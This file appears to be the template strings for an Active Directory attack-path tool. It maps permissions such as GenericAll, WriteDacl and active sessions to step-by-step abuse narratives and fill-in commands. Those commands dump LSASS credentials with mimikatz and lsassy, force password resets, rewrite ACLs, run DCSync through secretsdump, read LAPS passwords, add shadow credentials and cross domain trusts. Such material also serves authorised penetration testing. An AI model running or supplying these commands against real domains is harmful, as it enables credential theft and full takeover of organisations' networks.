member_of.title: Group Membership (inherited rights)
member_of.narrative: No action needed — you already hold every right granted to {to}. Continue the chain using {to}'s privileges.
member_of.default_command:
# You inherit all rights of the group {to}. Enumerate what it can reach:
Get-DomainGroup -Identity "{to}" | Select-Object memberof
Get-DomainGroupMember -Identity "{to}"

adminto.title: Local Admin → Remote Code Execution
adminto.narrative: {from} is local administrator on {to}. Execute code and dump credentials.

has_session.title: Session → Credential Theft
has_session.narrative: {to} has an active session on a host you control (or vice-versa). Dump LSASS to steal {to}'s credentials/TGT.
has_session.default_command:
# With local admin on the host, dump the logged-on creds of {to}
netexec smb {toShort} -u {USERNAME} -H {NTLM_HASH} -M lsassy
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

can_rdp.title: RDP Access
can_rdp.narrative: {from} may log on to {to} via RDP.

can_psremote.title: WinRM / PowerShell Remoting
can_psremote.narrative: {from} can open a remote PowerShell session on {to}.

execute_dcom.title: DCOM Lateral Execution
execute_dcom.narrative: {from} can execute code on {to} via DCOM.

forcechangepassword.title: Force Reset Target Password
forcechangepassword.narrative: {from} can reset the password of {to} without knowing the current one.
forcechangepassword.default_command:
# Linux
net rpc password "{toShort}" "NewP@ss123!" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}
# Windows (PowerView)
Set-DomainUserPassword -Identity {toShort} -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

genericall.title: Full Control (GenericAll)
genericall.narrative: {from} has full control over {to}. The abuse depends on what {to} is — add member (group), reset password / Shadow Creds (user), RBCD / Read-LAPS (computer), or DCSync (domain).

group.title: GenericAll on Group → Add Yourself

user.title: GenericAll on User → Reset PW / Shadow Creds

computer.title: GenericAll on Computer → RBCD / Shadow / LAPS

genericwrite.title: Write Properties
genericwrite.narrative: {from} can write attributes of {to}. On a group → add a member; on a user → targeted Kerberoast or Shadow Creds; on a computer → RBCD or Shadow Creds.

group.title: GenericWrite on Group → Add Member

user.title: GenericWrite on User → Targeted Roast / Shadow

writedacl.title: Write DACL → Grant Yourself Rights
writedacl.narrative: {from} can rewrite the ACL of {to}: grant yourself full control, then perform the matching abuse (add member for a group, DCSync for the domain).

group.title: WriteDacl on Group → Grant Rights, then Add Member

user.title: WriteDacl on User → Grant Rights, then Reset PW
user.command:
impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target "{toShort}" {DOMAIN}/{USERNAME}:{PASSWORD}
net rpc password "{toShort}" "NewP@ss123!" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}

writeowner.title: Take Ownership → Full Control
writeowner.narrative: {from} can set itself as owner of {to}, grant full control, then perform the matching abuse.

group.title: WriteOwner on Group → Own, Grant, Add Member

user.title: WriteOwner on User → Own, Grant, Reset PW

owns.title: Owner → Full Control
owns.narrative: {from} owns {to}, so it can grant itself any right.

addmember.title: Add Member to Group
addmember.narrative: {from} can add any principal to group {to}. Add yourself to inherit its rights.

allextendedrights.title: All Extended Rights → Reset PW / DCSync
allextendedrights.narrative: {from} holds all extended rights on {to} (includes ForceChangePassword on a user, or DCSync on the domain).
allextendedrights.default_command:
# User target → reset password:
net rpc password "{toShort}" "NewP@ss123!" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}
# Domain target → DCSync:
impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc

readlapspassword.title: Read LAPS Local Admin Password
readlapspassword.narrative: {from} can read the LAPS-managed local admin password of {to}.
readlapspassword.default_command:
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps
python3 pyLAPS.py --action get -d {DOMAIN} -u {USERNAME} -p {PASSWORD}

readgmsapassword.title: Read gMSA Password
readgmsapassword.narrative: {from} can read the managed password blob of gMSA {to}.

shadow_credentials.title: Shadow Credentials (Key Credential)
shadow_credentials.narrative: {from} can add a Key Credential to {to} and authenticate as it via PKINIT.
shadow_credentials.default_command:
certipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}
python3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {toShort} --action add

rbcd.title: Resource-Based Constrained Delegation
rbcd.narrative: {from} can write msDS-AllowedToActOnBehalfOfOtherIdentity on {to} → RBCD takeover.

constrained_delegation.title: Constrained Delegation (S4U)
constrained_delegation.narrative: {from} can impersonate any user to services {to} is allowed to delegate to.

dcsync.title: DCSync — Dump All Domain Hashes
dcsync.narrative: {from} can replicate directory changes — extract every credential including krbtgt.

getchanges.title: DCSync (partial right)
getchanges.narrative: {from} holds GetChanges; combined with GetChangesAll this enables DCSync.

sqladmin.title: MSSQL Admin → Command Execution
sqladmin.narrative: {from} is sysadmin on the SQL instance of {to}.

has_sid_history.title: SID History
has_sid_history.narrative: {from} carries the SID of {to} in SIDHistory — you already hold {to}'s access.
has_sid_history.default_command: # Access is automatic via SID History. Continue using {to}'s rights.

trusted_by.title: Domain Trust
trusted_by.narrative: {to} trusts {from}. Forge an inter-realm ticket or abuse SID history to cross the boundary.
trusted_by.default_command:
impacket-raiseChild {DOMAIN}/{USERNAME}:{PASSWORD}
# or forge trust ticket with the trust key (lsadump::trust /patch)
